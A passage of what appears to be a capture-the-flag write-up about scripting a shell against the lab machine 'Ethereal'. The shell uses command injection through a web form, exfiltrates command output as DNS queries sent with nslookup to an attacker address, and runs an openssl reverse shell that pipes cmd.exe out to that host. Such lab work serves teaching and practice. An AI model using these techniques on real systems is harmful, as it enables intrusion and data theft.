+</span><span class="nx">kup</span><span class="w"> </span><span class="s2">"Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.
+Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX"</span><span class="w"> </span><span class="nx">10.1.1.41</span><span class="p">))</span><span class="w">
+</span></code></pre></div></div>
+<p>That gives 6 of the 7 lines (<code class="language-plaintext highlighter-rouge">..</code> still breaks things):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">QVolumeX.QinX.QdriveX.QCX.QhasX.QnoX.Qlabel.X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+QVolumeX.QSerialX.QNumberX.QisX.QF06E-7663X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+QDirectoryX.QofX.QC:Users0xdftestX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+Q02/25/2019X.Q07:04X.QAMX.Q&lt;DIR&gt;X.Q.X.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+Q0X.QFile(s)X.Q0X.QbytesX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+Q2X.QDir(s)X.Q4,912,214,016X.QbytesX.QfreeX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.
+</span></code></pre></div></div>
+<h3 id="updating-dns-parse">Updating DNS Parse</h3>
+<p>Looking at the output above, I’ll notice that each field is broken by <code class="language-plaintext highlighter-rouge">X.Q</code>. So, to get this back to what I’m looking for, I’ll update the <code class="language-plaintext highlighter-rouge">parse_packet</code> function to replace <code class="language-plaintext highlighter-rouge">X.Q</code> with space. I’ll also drop the leading character (<code class="language-plaintext highlighter-rouge">Q</code>) and the trailing two (<code class="language-plaintext highlighter-rouge">X.</code>):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">23</span>     <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
+ <span class="mi">24</span>         <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qtype</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+ <span class="mi">25</span>             <span class="n">domain</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">26</span>             <span class="nf">print</span><span class="p">(</span><span class="n">domain</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">X.Q</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+</code></pre></div></div>
+<p>Now I can run commands from the VM and see results. I’ll show a couple examples with the output of the command on the VM, followed by what I get through DNS with the script.</p>
+<p><code class="language-plaintext highlighter-rouge">whoami</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="n">whoami</span><span class="w">
+</span><span class="go">sevener\0xdf
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sevener0xdf
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">whoami /priv</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PRIVILEGES INFORMATION
+----------------------
+Privilege Name Description State
+============================= ==================================== ========
+SeShutdownPrivilege Shut down the system Disabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeUndockPrivilege Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+SeTimeZonePrivilege Change the time zone Disabled
+SeTimeZonePrivilege Change the time zone Disabled
+</span></code></pre></div></div>
+<p>I lose spacing, <code class="language-plaintext highlighter-rouge">/</code>, and any line with <code class="language-plaintext highlighter-rouge">..</code> in it. But other than that, it’s pretty solid.</p>
+<h3 id="updating-command-sending">Updating Command Sending</h3>
+<p>Now I just need to update <code class="language-plaintext highlighter-rouge">default()</code> to generate the command string and send it. I’ll need to start with a <code class="language-plaintext highlighter-rouge">&amp;</code> to add another command, then put my loop:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">55</span>     <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">56</span>         <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">&amp; (FOR /F </span><span class="sh">"</span><span class="s">tokens=1-26</span><span class="sh">"</span><span class="s"> %a IN (</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="sh">'</span><span class="s">) DO ( nslookup </span><span class="sh">"</span><span class="s">Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX</span><span class="sh">"</span><span class="s"> 10.10.14.14 ))</span><span class="sh">'''</span>
+ <span class="mi">57</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="double-replies">Double Replies</h3>
+<p>What I have now kind of works, but it’s printing everything twice:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethereal&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w">
+</span><span class="go">etherealalan
+etherealalan
+</span><span class="gp">ethereal&gt;</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="nx">\</span><span class="w">
+</span><span class="go">Volume in drive C has no label.
+Volume in drive C has no label.
+Volume Serial Number is FAD9-1FD5
+Volume Serial Number is FAD9-1FD5
+Directory of c:
+Directory of c:
+07/07/2018 09:57 PM &lt;DIR&gt; Audit
+07/07/2018 09:57 PM &lt;DIR&gt; Audit
+06/30/2018 10:10 PM &lt;DIR&gt; inetpub
+06/30/2018 10:10 PM &lt;DIR&gt; inetpub
+06/26/2018 05:51 AM &lt;DIR&gt; Program Files
+06/26/2018 05:51 AM &lt;DIR&gt; Program Files
+07/16/2018 08:55 PM &lt;DIR&gt; Program Files (x86)
+07/16/2018 08:55 PM &lt;DIR&gt; Program Files (x86)
+07/05/2018 09:38 AM &lt;DIR&gt; Users
+07/05/2018 09:38 AM &lt;DIR&gt; Users
+07/01/2018 09:57 PM &lt;DIR&gt; Windows
+07/01/2018 09:57 PM &lt;DIR&gt; Windows
+0 File(s) 0 bytes
+0 File(s) 0 bytes
+6 Dir(s) 15,415,119,872 bytes free
+6 Dir(s) 15,415,119,872 bytes free
+</span></code></pre></div></div>
+<p>If I watch in <code class="language-plaintext highlighter-rouge">tcpdump</code>, I’ll see that each query is coming in multiple times. Here’s the line <code class="language-plaintext highlighter-rouge">06/30/2018 10:10 PM &lt;DIR&gt; inetpub</code> in 5 queries:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">22:26:08.157743 IP ethereal.htb.63609 &gt; kali.domain: 1+ PTR? 14.14.10.10.in-addr.arpa. (42)
+22:26:10.155284 IP ethereal.htb.56936 &gt; kali.domain: 2+ A? Q06/30/2018X.Q10:10X.QPMX.Q&lt;DIR&gt;X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                               
+22:26:12.155170 IP ethereal.htb.56937 &gt; kali.domain: 3+ AAAA? Q06/30/2018X.Q10:10X.QPMX.Q&lt;DIR&gt;X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                            
+22:26:14.155072 IP ethereal.htb.56938 &gt; kali.domain: 4+ A? Q06/30/2018X.Q10:10X.QPMX.Q&lt;DIR&gt;X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                               
+22:26:16.856501 IP ethereal.htb.56939 &gt; kali.domain: 5+ AAAA? Q06/30/2018X.Q10:10X.QPMX.Q&lt;DIR&gt;X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)
+</span></code></pre></div></div>
+<p>I suspect that’s because it doesn’t get an answer, so it tries to ask again. I’ll update the DNS listener to send a response for each domain with the answer “127.0.0.1”:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">23</span>     <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
+ <span class="mi">24</span>         <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qtype</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+ <span class="mi">25</span>             <span class="n">domain</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">26</span>             <span class="nf">print</span><span class="p">(</span><span class="n">domain</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">X.Q</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+ <span class="mi">27</span>             <span class="n">reply</span> <span class="o">=</span> <span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span><span class="p">)</span><span class="o">/</span><span class="nc">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span><span class="o">/</span><span class="nc">DNS</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">DNS</span><span class="p">].</span><span class="nb">id</span><span class="p">,</span>
+ <span class="mi">28</span>                     <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">an</span><span class="o">=</span><span class="nc">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">DNSQR</span><span class="p">].</span><span class="n">qname</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">)</span><span class="o">/</span><span class="nc">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">domain</span><span class="p">,</span>
+ <span class="mi">29</span>                     <span class="n">rdata</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">))</span>
+ <span class="mi">30</span>             <span class="nf">send</span><span class="p">(</span><span class="n">reply</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">)</span>
+</code></pre></div></div>
+<p>That eliminates the doubles, and reduces the number of DNS packets from five to three, and speeds up the process.</p>
+<h2 id="improvements">Improvements</h2>
+<h3 id="error-checking">Error Checking</h3>
+<p>Sometimes I would walk away from my computer, and the state tokens would go stale. That causes a 500 response to come back when I sent a POST. I could just kill the shell and re-open it, but I’d rather have it just recognize the issue and re-initiate. To do this, I’ll move much of the stuff from <code class="language-plaintext highlighter-rouge">__init__()</code> to a <code class="language-plaintext highlighter-rouge">do_login()</code> function (and call it from <code class="language-plaintext highlighter-rouge">__init__()</code>), and then add a check on the response when I make a POST. If it comes back 500 immediately (using a timer to differentiate from a call that eventually times out to 500 while running a lot of DNS), I’ll call <code class="language-plaintext highlighter-rouge">do_login</code>. Having the Login function start with <code class="language-plaintext highlighter-rouge">do_</code> means that I can refresh my login any time by just entering <code class="language-plaintext highlighter-rouge">login</code> from the shell command line.</p>
+<p>My <code class="language-plaintext highlighter-rouge">send_post</code> now looks like this:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">64</span>     <span class="k">def</span> <span class="nf">send_post</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">search</span><span class="p">):</span>
+ <span class="mi">65</span>         <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">__VIEWSTATE</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state</span><span class="p">,</span>
+ <span class="mi">66</span>                 <span class="sh">'</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span><span class="p">,</span>
+ <span class="mi">67</span>                 <span class="sh">'</span><span class="s">__EVENTVALIDATION</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">event_val</span><span class="p">,</span>
+ <span class="mi">68</span>                 <span class="sh">'</span><span class="s">search</span><span class="sh">'</span><span class="p">:</span> <span class="n">search</span><span class="p">,</span>
+ <span class="mi">69</span>                 <span class="sh">'</span><span class="s">ctl02</span><span class="sh">'</span><span class="p">:</span> <span class="sh">''</span><span class="p">}</span>
+ <span class="mi">70</span>         <span class="k">try</span><span class="p">:</span>
+ <span class="mi">71</span>             <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+ <span class="mi">72</span>             <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span>
+ <span class="mi">73</span>                              <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">,</span>
+ <span class="mi">74</span>                              <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span>
+ <span class="mi">75</span>                              <span class="n">auth</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">,</span>
+ <span class="mi">76</span>                              <span class="n">timeout</span><span class="o">=</span><span class="mi">120</span><span class="p">)</span>
+ <span class="mi">77</span>             <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">:</span>
+ <span class="mi">78</span>                 <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Unable to connect to Ethereal</span><span class="se">\n</span><span class="s">[*] Running login</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">79</span>                 <span class="n">self</span><span class="p">.</span><span class="nf">do_login</span><span class="p">()</span>
+ <span class="mi">80</span>                 <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Try running the command again.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">81</span>         <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
+ <span class="mi">82</span>             <span class="k">pass</span>
+
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">do_login</code> looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">54</span>     <span class="k">def</span> <span class="nf">do_login</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
+ <span class="mi">55</span>         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Logging in and fetching state information.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">56</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">)</span>
+ <span class="mi">57</span>         <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">58</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATE</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">59</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">60</span>         <span class="n">self</span><span class="p">.</span><span class="n">event_val</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__EVENTVALIDATION</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">61</span>         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] State information received.</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="clean-exit">Clean Exit</h3>
+<p>Right now, when I want to exit the shell, I have to ctrl-c twice, to kill the terminal and the DNS thread. And it dies with exceptions all over the screen.</p>
+<p>There’s not a really clean way that I know of to kill a thread like this from somewhere else in the code. But I came up with a kludge.</p>
+<p>The command running in the DNS thread is:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">src host </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">target_ip</span><span class="si">}</span><span class="s"> and udp port 53</span><span class="sh">"</span><span class="p">,</span><span class="n">prn</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">parse_packet</span><span class="p">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">sniff</code> actually has a parameter you can pass it, <code class="language-plaintext highlighter-rouge">stop_filter</code>. It is a function that is passed each packet, and, if it returns True, will stop <code class="language-plaintext highlighter-rouge">sniff</code>. So I’ll add one that if I get a query for a pre-defined domain, I’ll exit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">12</span> <span class="n">kill_domain</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf.0xdf.</span><span class="sh">"</span>
+<span class="bp">...</span>
+ <span class="mi">23</span>     <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">24</span>         <span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">src host </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">target_ip</span><span class="si">}</span><span class="s"> and udp port 53</span><span class="sh">"</span><span class="p">,</span>
+ <span class="mi">25</span>                 <span class="n">prn</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">parse_packet</span><span class="p">,</span> <span class="n">stop_filter</span><span class="o">=</span><span class="k">lambda</span> <span class="n">p</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span>
+ <span class="mi">26</span>                 <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">kill_domain</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Then I’ll add a <code class="language-plaintext highlighter-rouge">do_exit</code> function that gets Ethereal to send a query for that domain, and then exits:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">79</span>     <span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">80</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">&amp; nslookup </span><span class="si">{</span><span class="n">kill_domain</span><span class="si">}</span><span class="s"> 10.10.14.14</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">81</span>         <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+<p>I’ll add a check in <code class="language-plaintext highlighter-rouge">parse_packet</code>, as the <code class="language-plaintext highlighter-rouge">prn</code> gets called first, to not print this domain:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">31</span>             <span class="n">domain</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">32</span>             <span class="k">if</span> <span class="n">domain</span> <span class="o">==</span> <span class="n">kill_domain</span><span class="p">:</span> <span class="k">return</span>
+</code></pre></div></div>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py
+<span class="gp">ethereal&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">etherealalan
+</span><span class="gp">ethereal&gt;</span><span class="w"> </span><span class="nb">exit</span>
+<span class="go">root@kali#
+</span></code></pre></div></div>
+<p>I can also add a wrapper around my <code class="language-plaintext highlighter-rouge">cmdloop</code> to catch ctrl-c:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">94</span> <span class="k">try</span><span class="p">:</span>
+ <span class="mi">95</span>     <span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+ <span class="mi">96</span> <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+ <span class="mi">97</span>     <span class="n">term</span><span class="p">.</span><span class="nf">do_exit</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="quiet-command">quiet Command</h3>
+<p>There are a bunch of cases where I need to send a command that I don’t need output for. And there are cases where the for loop into <code class="language-plaintext highlighter-rouge">nslookup</code> is causing issues. For this reason, I’ll create a <code class="language-plaintext highlighter-rouge">quiet</code> command. This will take a command and just run it via the injection without the exfil of the response. To add a command in a Cmd terminal, I just create a function <code class="language-plaintext highlighter-rouge">do_[cmd_name]</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">do_quiet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">&amp; ( </span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="s"> )</span><span class="sh">'</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</code></pre></div></div>
+<p>To call it, I can now just run:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethereal&gt;</span><span class="w"> </span><span class="n">quiet</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="adding-messages">Adding Messages</h3>
+<p>I like to have a system that tells me what it’s doing. I’ll add in status messages throughout the shell. Now, for example, when I start the shell, it tells me what’s going on when I am waiting for startup:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="o">.</span><span class="n">/ethereal_shell.py</span><span class="w"> 
+</span><span class="go">[*] Starting DNS Sniffer on tun0 for target 10.10.10.106.
+[*] Logging in and fetching state information.
+[+] State information received.
+</span><span class="gp">ethereal&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Or exiting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethereal&gt;</span><span class="w"> </span><span class="kr">exit</span><span class="w">
+</span><span class="go">[*] Sending kill request.
+[*] Received kill packet. Shutting down sniffer thread.
+</span></code></pre></div></div>
+<h2 id="full-code">Full Code</h2>
+<p>The final code is below, and I’ll post it on <a href="https://gitlab.com/0xdf/ctfscripts">my scripts git repo</a>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python3
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">import</span> <span class="n">requests</span>
+  <span class="mi">4</span> <span class="kn">import</span> <span class="n">sys</span>
+  <span class="mi">5</span> <span class="kn">import</span> <span class="n">time</span>
